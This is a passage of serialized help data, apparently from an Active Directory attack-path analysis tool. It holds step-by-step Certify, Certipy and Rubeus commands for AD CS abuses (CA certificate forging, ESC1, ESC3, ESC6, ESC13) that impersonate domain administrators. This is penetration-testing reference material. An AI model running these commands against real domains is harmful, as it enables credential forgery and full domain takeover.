principal using the certificate with Rubeus:",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Rubeus.exe asktgt /user:Roshi /domain:dumpster.fire /certificate:target.pfx /password:NewPassword123!"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["1) Back up the CA certificate with the credentials of a user with admin access on the enterprise CA host using Certipy:",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certipy ca -backup -ca 'dumpster-DC01-CA' -username jd@dumpster.fire -password 'Password123!'"},"_owner":null,"_store":{}},"The enterprise CA certificate is the one where issuer and subject are identical.",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"2) Forge a certificate of a target principal:",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certipy forge -ca-pfx dumpster-DC01-CA.pfx -upn Roshi@dumpster.fire -subject 'CN=Roshi,OU=Users,OU=Tier0,DC=dumpster,DC=fire'"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"3) Request a TGT for the targeted principal using the certificate against a given DC:",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certipy auth -pfx roshi_forged.pfx -dc-ip '192.168.100.10'"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},"abuse":{}},{"technique":"ADCSESC1","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform this attack in the following steps:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 1"},"_owner":null,"_store":{}},": Use Certify to request enrollment in the affected template, specifying the affected certification authority and target principal to impersonate:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:\"ESC1\" /altname:forestrootda /sidextension:S-1-5-21-2697957641-2271029196-387917394-500"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Save the certificate as cert.pem and the private key as cert.key."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 2"},"_owner":null,"_store":{}},": Convert the emitted certificate to PFX format:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certutil.exe -MergePFX .\\cert.pem .\\cert.pfx"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 3"},"_owner":null,"_store":{}},": Optionally purge all kerberos tickets from memory:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"klist purge"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 4"},"_owner":null,"_store":{}},": Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the PFX-formatted certificate created in Step 2:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Rubeus asktgt /user:forestrootda /domain:forestroot.com /certificate:cert.pfx /password:asdf /ptt"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 5"},"_owner":null,"_store":{}},": Optionally verify the TGT by listing it with the klist command:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"klist"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform this attack in the following steps:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 1"},"_owner":null,"_store":{}},": Use Certipy to request enrollment in the affected template, specifying the target enterprise CA and target principal to impersonate:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC1 -upn administrator@corp.local"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 2"},"_owner":null,"_store":{}},": Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"ADCSESC4","windows":{},"linux":{},"abuse":{}},{"technique":"ADCSESC3","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The ESC3 attack can be carried out in the following manner."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"span","sx":{"fontWeight":"bold"},"children":"Step 1:"},"_owner":null,"_store":{}}," ","Use Certify to request an enrollment agent certificate."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Certify.exe request /ca:CORPDC01.CORP.LOCAL\\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"span","sx":{"fontWeight":"bold"},"children":"Step 2:"},"_owner":null,"_store":{}}," ","Convert the emitted certificate to PFX format."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certutil.exe -MergePFX .\\enrollmentcert.pem .\\enrollmentcert.pfx"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"span","sx":{"fontWeight":"bold"},"children":"Step 3:"},"_owner":null,"_store":{}}," ","Use the enrollment agent certificate to issue a certificate request on behalf of another user to a certificate template that allow for authentication and permit enrollment agent enrollment."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Certify.exe request /ca:CORPDC01.CORP.LOCAL\\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\\itadmin /enrollcert:enrollmentcert.pfx"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["Save the certificate as ",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"code","children":"itadminenrollment.pem"},"_owner":null,"_store":{}}," and the private key as"," ",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"code","children":"itadminenrollment.key"},"_owner":null,"_store":{}},"."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the target principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. Choose another target with the given attribute set."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"span","sx":{"fontWeight":"bold"},"children":"Step 4:"},"_owner":null,"_store":{}}," ","Convert the emitted certificate to PFX format."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certutil.exe -MergePFX .\\itadminenrollment.pem .\\itadminenrollment.pfx"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"span","sx":{"fontWeight":"bold"},"children":"Step 5:"},"_owner":null,"_store":{}}," ","Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the PFX-formatted certificate created in Step 4."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Rubeus.exe asktgt /user:itadmin /domain:corp.local /certificate:itadminenrollment.pfx"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The ESC3 attack can be carried out in the following manner."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"span","sx":{"fontWeight":"bold"},"children":"Step 1:"},"_owner":null,"_store":{}}," ","Use Certipy to request an enrollment agent certificate."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template'"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"span","sx":{"fontWeight":"bold"},"children":"Step 2:"},"_owner":null,"_store":{}}," ","Use the enrollment agent certificate to issue a certificate request on behalf of another user to a certificate template that allow for authentication and permit enrollment agent enrollment."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'User' -on-behalf-of 'contoso\\administrator' -pfx 'user.pfx'"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the target principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. Choose another target with the given attribute set."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"span","sx":{"fontWeight":"bold"},"children":"Step 3:"},"_owner":null,"_store":{}}," ","Request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the PFX-formatted certificate created in Step 2."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"ADCSESC6a","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform this attack in the following steps:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 1"},"_owner":null,"_store":{}},": Use Certify to request enrollment in the affected template, specifying the affected enterprise CA and target principal to impersonate:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":".\\Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:ESC6 /altname:<target UPN or SAMAccountName without $> /url:\"tag:microsoft.com,2022-09-14:sid:<target SID>\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 2"},"_owner":null,"_store":{}},": Convert the emitted certificate to PFX format:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certutil.exe -MergePFX .cert.pem .cert.pfx"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 3"},"_owner":null,"_store":{}},": Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the PFX-formatted certificate created in Step 2:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":".\\Rubeus.exe asktgt /certificate:cert.pfx /user:forestrootda /domain:forestroot.com /password:asdf /ptt"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 4"},"_owner":null,"_store":{}},": Optionally verify the TGT by listing it with the klist command:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"klist"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform this attack in the following steps:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 1"},"_owner":null,"_store":{}},": Use Certipy to request enrollment in the affected template, specifying the affected enterprise CA and target principal to impersonate:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC6 -upn administrator@corp.local"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 2"},"_owner":null,"_store":{}},": Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If the authentication fails then it may be because the DC enforces strong certificate mapping. This requirement can be met by including a URL parameter in the SAN with the target's SID, however not supported by Certipy. See the Windows abuse section for example."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"ADCSESC6b","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform this attack in the following steps:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"span","sx":{"fontWeight":"bold"},"children":"Step 1:"},"_owner":null,"_store":{}}," ","Use Certify to request enrollment int he affected template, specifying the affected certification authority and target principal to impersonate:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":".\\Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:ESC6 /altname:forestrootda"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"span","sx":{"fontWeight":"bold"},"children":"Step 2:"},"_owner":null,"_store":{}}," ","Convert the emitted certificate to PFX format:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certutil.exe -MergePFX .\\cert.pem .\\cert.pfx"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"span","sx":{"fontWeight":"bold"},"children":"Step 3:"},"_owner":null,"_store":{}}," ","Use Certipy to connect to the domain controller via Schannel, specifying the PFX-formatted certificate created in Step 2:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certipy auth -pfx .\\cert.pfx -dc-ip 10.4.0.4 -ldap-shell"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform this attack in the following steps:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"span","sx":{"fontWeight":"bold"},"children":"Step 1:"},"_owner":null,"_store":{}}," ","Use Certipy to request enrollment in the affected template, specifying the target enterprise CA and target principal to impersonate:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC6 -upn administrator@corp.local"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"span","sx":{"fontWeight":"bold"},"children":"Step 2:"},"_owner":null,"_store":{}}," ","Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"ADCSESC9a","windows":{},"linux":{},"abuse":{}},{"technique":"ADCSESC9b","windows":{},"linux":{},"abuse":{}},{"technique":"ADCSESC10a","windows":{},"linux":{},"abuse":{}},{"technique":"ADCSESC10b","windows":{},"linux":{},"abuse":{}},{"technique":"ADCSESC13","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The principal can now perform an ESC13 abuse with the following steps:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 1"},"_owner":null,"_store":{}},": Use Certify to request enrollment in the affected template, specifying the affected certification authority:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:\"ESC13\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Save the certificate as cert.pem and the private key as cert.key."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 2"},"_owner":null,"_store":{}},": Convert the emitted certificate to PFX format:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certutil.exe -MergePFX .\\cert.pem .\\cert.pfx"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 3"},"_owner":null,"_store":{}},": Optionally purge all kerberos tickets from memory:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"klist purge"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 4"},"_owner":null,"_store":{}},": Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the attacker identity, the PFX-formatted certificate created in Step 2, and the certificate password:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Rubeus asktgt /user:attacker /domain:forestroot.com /certificate:cert.pfx /password:asdf /ptt"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 5"},"_owner":null,"_store":{}},": Optionally verify the TGT by listing it with the klist command:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"klist"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform this attack in the following steps:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 1"},"_owner":null,"_store":{}},": Use Certipy to request enrollment in the affected template, specifying the affected enterprise CA:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC13"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 2"},"_owner":null,"_store":{}},": Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certipy auth -pfx john.pfx -dc-ip 172.16.126.128"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"ManageCA","windows":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"linux":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"abuse":{}},{"technique":"ManageCertificates","windows":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"linux":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"abuse":{}},{"technique":"WritePKIEnrollmentFlag","windows":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"linux":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"abuse":{}},{"technique":"WritePKINameFlag","windows":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"linux":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"abuse":{}},{"technique":"DCFor","windows":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Domain Controllers store all Active Directory credentials and configurations for all principals in the domain. If an adversary gains administrative access to a Domain Controller, there are several options at their disposal for compromising domain identities and domain-managed systems. Please see the references section for more information."},"_owner":null,"_store":{}},"linux":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Domain Controllers store all Active Directory credentials and configurations for all principals in the domain. If an adversary gains administrative access to a Domain Controller, there are several options at their disposal for compromising domain identities and domain-managed systems. Please see the references section for more information."},"_owner":null,"_store":{}},"abuse":{}},{"technique":"OIDGroupLink","windows":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform the ADCS ESC13 abuse which relies on the OID group link. This relationship alone is not enough to escalate rights or impersonate other principals."},"_owner":null,"_store":{}},"linux":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform the ADCS ESC13 abuse which relies on the OID group link. This relationship alone is not enough to escalate rights or impersonate other principals."},"_owner":null,"_store":{}},"abuse":{}},{"technique":"ExtendedByPolicy","windows":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform the ADCS ESC13 abuse which relies on an issuance policy included in a certificate. This relationship alone is not enough to escalate rights or impersonate other principals."},"_owner":null,"_store":{}},"linux":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform the ADCS ESC13 abuse which relies on an issuance policy included in a certificate. This relationship alone is not enough to escalate 